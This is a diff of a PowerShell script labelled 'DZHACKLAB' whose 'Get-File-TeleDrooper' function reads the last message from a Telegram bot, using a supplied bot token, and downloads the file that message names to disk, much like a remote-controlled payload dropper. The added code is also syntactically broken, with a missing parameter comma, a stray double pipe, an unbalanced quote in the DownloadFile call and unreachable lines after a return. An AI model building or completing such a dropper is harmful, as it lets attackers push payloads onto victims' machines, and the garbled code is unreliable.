@@ -1,14 +1,33 @@
 
 
+function Log-Message
+{
+    [CmdletBinding()]
+    Param
+    (
+        [Parameter(Mandatory=$true, Position=0)]
+        [string]$LogMessage
+    )
+
+    Write-Output (" [DZHACKLAB] - ELMO9AWIM {0} - {1}" -f (Get-Date), $LogMessage)
+}
+
+Log-Message " [*] START JOB ------------------- ELMO9AWIM "
 
 
-function Execute-HTTPGetCommand()
+
+
+function Execute-HTTP-DOWNLOAD-GetCommand()
 {
   [CmdletBinding()]
   Param
   (
         [Parameter(Mandatory=$true, Position=0)]
         [string]$FILE
+        
+        [Parameter(Mandatory=$true, Position=0)]
+        [string]$SAVE
+        
   )
   
   $webRequest = [System.Net.WebRequest]::Create($target)
@@ -19,6 +38,15 @@ function Execute-HTTPGetCommand()
   [System.IO.StreamReader]$sr = New-Object System.IO.StreamReader -argumentList $rs
   [string]$results = $sr.ReadToEnd()
   return $results
+  
+  return $result | | Out-File -FilePath $SAVE
+  
+  
+  
+  (new-object System.Net.WebClient).DownloadFile( '$url, $path)
+
+  
+  
 }
 
 Function Get-File-TeleDrooper{
@@ -27,7 +55,7 @@ Function Get-File-TeleDrooper{
   [Parameter(Mandatory=$true,Position=0)] [String[]]$BToken
 
   )
-  Write-Output "BOT ID: $BId || BOT TOKEN: BToken"
+  Write-Output "BOT ID: $BId || BOT TOKEN: $BToken"
 
 
   $MyToken = $BToken
@@ -42,11 +70,17 @@ Function Get-File-TeleDrooper{
       $LastMessage = $Result.message.text
     }
   }
-   
+
+  Log-Message " [*] START DOWNLOADING ------------------- ELMO9AWIM "
+
   Write-Host "RUN ME $($LastMessage)"
 
   $TELEFILE = $LastMessage
 
-  Execute-HTTPGetCommand $TELEFILE
+  Execute-HTTP-DOWNLOAD-GetCommand $TELEFILE $SAVE
 
+  Log-Message " [*] END JOB ------------------- ELMO9AWIM "
+  
+  
+  
 }
